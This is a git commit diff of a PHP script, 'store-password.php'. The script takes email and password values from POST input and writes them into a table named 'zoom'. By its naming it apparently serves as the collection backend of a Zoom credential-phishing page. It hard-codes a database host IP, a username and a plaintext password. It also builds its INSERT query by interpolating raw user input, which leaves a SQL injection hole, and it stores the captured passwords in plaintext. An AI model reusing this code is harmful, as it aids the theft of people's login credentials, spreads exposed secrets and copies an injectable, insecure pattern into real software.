5665f53c5fe220bd536950b94bf7664bc8ef4380
mondousage <casspangell@gmail.com>
2023-07-11 14:41:05 -0600

    Update store-password.php

--- store-password.php
+++ store-password.php
@@ -7,6 +7,7 @@ $hostname="74.124.198.128";
 $username="asoulh5"; 
 $password="\$Mi11ion\$123"; 
 $dbname="asoulh5_zoom"; 
+$tablename="zoom";
 
 // Create a new connection
 $conn = new mysqli($servername, $username, $password, $dbname);
@@ -20,7 +21,7 @@ if ($conn->connect_error) {
 $email = $_POST['email'];
 $password = $_POST['password'];
 $timestamp = date("Y-m-d");
-$sql = "INSERT INTO zoom (password, timestamp, email) VALUES ('$password', '$timestamp', '$email')";
+$sql = "INSERT INTO $tablename (password, timestamp, email) VALUES ('$password', '$timestamp', '$email')";
 
 // Execute the SQL statement
 if ($conn->query($sql) === TRUE) {
